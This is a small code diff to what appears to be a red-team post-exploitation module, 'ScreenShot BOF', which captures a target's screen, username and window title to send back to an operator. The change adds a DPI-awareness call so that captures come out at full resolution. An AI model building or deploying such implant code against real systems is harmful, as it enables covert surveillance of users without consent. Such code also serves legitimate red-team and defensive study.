@@ -43,6 +43,7 @@ DECLSPEC_IMPORT int WINAPI GDI32$GetObjectW(HANDLE h,int c,LPVOID pv);
 DECLSPEC_IMPORT HRESULT  WINAPI   OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
 DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$DeleteObject(HGDIOBJ ho);
 DECLSPEC_IMPORT int WINAPI User32$ReleaseDC(HWND hWnd, HDC  hDC);
+DECLSPEC_IMPORT BOOL WINAPI User32$SetProcessDPIAware();
 
 void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
     int messageLength;
@@ -110,6 +111,7 @@ int go()
     ULARGE_INTEGER size;
     char* user = (char*)MSVCRT$getenv("USERNAME");
     char title[] = "ScreenShot BOF";
+    BOOL b = User32$SetProcessDPIAware();
     int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
     int titleLength = MSVCRT$_snprintf(NULL, 0, "%s", title);
     DWORD session = -1;
@@ -229,4 +231,3 @@ done:
     User32$ReleaseDC(NULL, hdcScreen);
     return 0;
 }
-
